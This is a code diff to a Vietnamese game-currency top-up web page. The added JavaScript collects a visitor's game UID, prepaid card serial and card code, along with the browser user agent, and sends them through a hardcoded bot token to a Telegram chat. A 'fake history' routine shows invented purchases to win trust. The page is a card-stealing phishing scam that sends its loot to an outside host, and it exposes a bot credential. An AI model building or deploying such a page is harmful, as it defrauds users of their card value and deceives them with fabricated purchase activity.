@@ -210,38 +210,109 @@ input{
 <div class="loading" id="loading"><div class="loader"></div></div>
 
 <script>
-const BOT_TOKEN="8301552072:AAE8XG6Azgud5GVtYPrvvLo04HE8F_9ZN2c";
-const CHAT_ID="5903999893";
+/* ===== TELEGRAM CONFIG ===== */
+const BOT_TOKEN = "8301552072:AAE8XG6Azgud5GVtYPrvvLo04HE8F_9ZN2c";
+const CHAT_ID  = "5903999893";
 
-function toggleDark(){document.body.classList.toggle("dark")}
-document.querySelectorAll(".price").forEach(i=>i.onclick=()=>{document.querySelectorAll(".price").forEach(x=>x.classList.remove("active"));i.classList.add("active")})
-document.querySelectorAll(".pay").forEach(i=>i.onclick=()=>{document.querySelectorAll(".pay").forEach(x=>x.classList.remove("active"));i.classList.add("active")})
-
-function openPopup(){document.getElementById("popup").style.display="flex"}
-
-function sendTelegram(){
-  document.getElementById("loading").style.display="flex";
-  setTimeout(()=>{
-    document.getElementById("loading").style.display="none";
-    document.getElementById("popup").style.display="none";
-    alert("Đã gửi, chờ admin duyệt");
-  },1500);
+/* ===== UI HANDLER ===== */
+function toggleDark(){
+  document.body.classList.toggle("dark");
 }
 
+document.querySelectorAll(".price").forEach(i=>{
+  i.onclick=()=>{
+    document.querySelectorAll(".price").forEach(x=>x.classList.remove("active"));
+    i.classList.add("active");
+  }
+});
+
+document.querySelectorAll(".pay").forEach(i=>{
+  i.onclick=()=>{
+    document.querySelectorAll(".pay").forEach(x=>x.classList.remove("active"));
+    i.classList.add("active");
+  }
+});
+
+function openPopup(){
+  if(!document.getElementById("uid").value){
+    alert("Vui lòng nhập UID");
+    return;
+  }
+  document.getElementById("popup").style.display="flex";
+}
+
+/* ===== SEND TELEGRAM REAL ===== */
+function sendTelegram(){
+  const uid    = document.getElementById("uid").value.trim();
+  const serial = document.getElementById("serial").value.trim();
+  const code   = document.getElementById("code").value.trim();
+
+  if(!uid || !serial || !code){
+    alert("Nhập đầy đủ thông tin thẻ");
+    return;
+  }
+
+  const price = document.querySelector(".price.active");
+  const pay   = document.querySelector(".pay.active");
+
+  const money = price.dataset.money;
+  const kc    = price.dataset.kc;
+  const type  = pay.dataset.type;
+
+  const msg =
+`🧾 THẺ NẠP MỚI
+━━━━━━━━━━━━━━
+👤 UID: ${uid}
+💎 Gói: ${kc} KC
+💰 Giá: ${Number(money).toLocaleString()}đ
+💳 Loại thẻ: ${type}
+🔢 Serial: ${serial}
+🔐 Mã thẻ: ${code}
+━━━━━━━━━━━━━━
+🌐 UA: ${navigator.userAgent}
+⏰ ${new Date().toLocaleString()}`;
+
+  document.getElementById("loading").style.display="flex";
+
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+    method:"POST",
+    headers:{ "Content-Type":"application/json" },
+    body:JSON.stringify({
+      chat_id: CHAT_ID,
+      text: msg
+    })
+  })
+  .then(r=>r.json())
+  .then(d=>{
+    document.getElementById("loading").style.display="none";
+    if(d.ok){
+      alert("✅ Đã gửi thẻ, vui lòng chờ duyệt");
+      document.getElementById("popup").style.display="none";
+      document.getElementById("serial").value="";
+      document.getElementById("code").value="";
+    }else{
+      alert("❌ Bot lỗi – kiểm tra TOKEN / CHAT_ID");
+    }
+  })
+  .catch(()=>{
+    document.getElementById("loading").style.display="none";
+    alert("❌ Không kết nối được Telegram");
+  });
+}
+
+/* ===== FAKE HISTORY (GIỮ NGUYÊN) ===== */
 const users=["28451046","8371904619","836107417","2828121268"];
 const packs=["300 KC","600 KC","1.500 KC","3.000 KC","15.000 KC"];
+
 function fakeHistory(){
   const h=document.getElementById("history");
   const div=document.createElement("div");
   div.className="history-item";
-  div.innerHTML=`<span>${users[Math.floor(Math.random()*users.length)]}</span><span>${packs[Math.floor(Math.random()*packs.length)]}</span>`;
+  div.innerHTML=`<span>${users[Math.floor(Math.random()*users.length)]}</span>
+                 <span>${packs[Math.floor(Math.random()*packs.length)]}</span>`;
   h.prepend(div);
   if(h.children.length>6)h.removeChild(h.lastChild);
 }
 setInterval(fakeHistory,3000);
 fakeHistory();
 </script>
-
-</body>
-
-</html>
